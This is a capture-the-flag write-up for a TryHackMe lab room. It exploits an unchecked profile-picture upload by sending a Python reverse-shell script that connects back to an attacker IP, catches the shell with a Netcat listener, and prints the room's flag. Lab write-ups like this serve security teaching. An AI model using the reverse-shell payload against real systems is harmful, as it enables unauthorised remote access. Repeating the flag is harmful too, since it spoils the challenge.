# Speed Chatting

**Room:** [Love at First Breach 2026 – Speed Chatting](https://tryhackme.com/room/lafb2026e4)

An unrestricted file upload vulnerability that leads straight to a reverse shell. The app lets you upload a profile picture, but never actually checks what kind of file you're sending so instead of a `.jpg`, we hand it a `.py` file and walk out with a shell on the box.

![Speed Chatting](../Screenshots/Love%20at%20First%20Breach%202026/banner%20speed%20chatting.png)

---

## Recon

Access at: `http://10.114.147.144:5000`

Browsing the site revealed two main features a **chat system** and a **profile picture upload** functionality.

![LoveConnect homepage](../Screenshots/Love%20at%20First%20Breach%202026/02_loveconnect_homepage.png)

I uploaded a random picture first just to check the normal behavior of the upload feature, but nothing unusual happened.

![Uploading a random picture](../Screenshots/Love%20at%20First%20Breach%202026/03_upload_random_pic.png)

---

## Identifying the Vulnerability

Inside the HTML source, we find the upload form:

```html
<form action='/upload_profile_pic' method='post' enctype='multipart/form-data'>
```

![Page source showing the upload form](../Screenshots/Love%20at%20First%20Breach%202026/04_page_source_upload_form.png)

When testing the upload feature further, the application allowed uploading a `.py` file without any restriction on file type. This is a major security flaw there's no validation on the file extension or content, so the server will happily accept an executable script disguised as a "profile picture."

---

## Creating the Reverse Shell

To exploit this, we generate a Python reverse shell.

**File name:** `shell.py`

**Contents:**

```python
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.17.1",1234)); os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);
```

---

## Setting Up the Listener

Before triggering the payload, we start a Netcat listener on our attacking machine:

```
nc -lvnp 1234
```

Output:

```
listening on [any] 1234 ...
```

Now we upload `shell.py` using the profile upload feature.

![Shell uploaded successfully](../Screenshots/Love%20at%20First%20Breach%202026/05_shell_upload_success.png)

And we get a connection back on our listener:

![Netcat catches the reverse shell and reads the flag](../Screenshots/Love%20at%20First%20Breach%202026/06_netcat_reverse_shell_flag.png)

Once inside, a quick `ls` in `/opt/Speed_Chat` shows `app.py`, `flag.txt`, and the `uploads` folderconfirming we've landed in the app's own working directory with shell access.

```
root@tryhackme-2204:/opt/Speed_Chat# cat flag.txt
THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}
```

---

## Flag

```
THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}
```

